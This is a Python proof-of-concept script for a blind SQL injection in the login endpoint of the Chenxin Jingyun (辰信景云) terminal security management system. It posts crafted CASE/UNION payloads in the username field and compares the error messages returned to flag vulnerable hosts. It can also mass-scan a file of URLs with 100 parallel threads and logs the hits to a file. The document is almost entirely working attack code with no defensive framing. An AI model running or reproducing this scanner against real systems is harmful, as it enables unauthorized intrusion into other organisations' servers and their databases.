# 辰信景云终端安全管理系统 login SQL 注入漏洞 
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """      _                _       
 | |    ___   __ _(_)_ __  
 | |   / _ \ / _` | | '_ \ 
 | |__| (_) | (_| | | | | |
 |_____\___/ \__, |_|_| |_|
             |___/         
                    version:1.0.8 
                    author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统 login SQL 注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    path = "/rep/login"
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    payload = "' AND 1=(SELECT (CASE WHEN(length(DATABASE())>0) THEN 1 ELSE (SELECT 3277 UNION SELECT 2760) END))-- -"
    data = "username=1213@qq.com"+payload+"&password=202cb962ac59075b964b07152d234b70&captcha="
        # 当前数据库名小于0
    payload_2 = "' AND 1=(SELECT (CASE WHEN(length(DATABASE())<0) THEN 1 ELSE (SELECT 3277 UNION SELECT 2760) END))-- -"
    data_2 = "username=1213@qq.com"+payload_2+"&password=202cb962ac59075b964b07152d234b70&captcha="
    try:
            res  = requests.post(url=target+path,headers=headers,data=data,timeout=10)
            res2  = requests.post(url=target+path,headers=headers,data=data_2,timeout=10)
            if ('邮箱或密码输入错误' in  res.text or '您的账号已被锁定' in res.text) and ('服务器繁忙' in  res2.text):
                print(f"[+该url存在漏洞{target}")
                with open('try006.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
            else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False

if __name__ == '__main__':
    main()
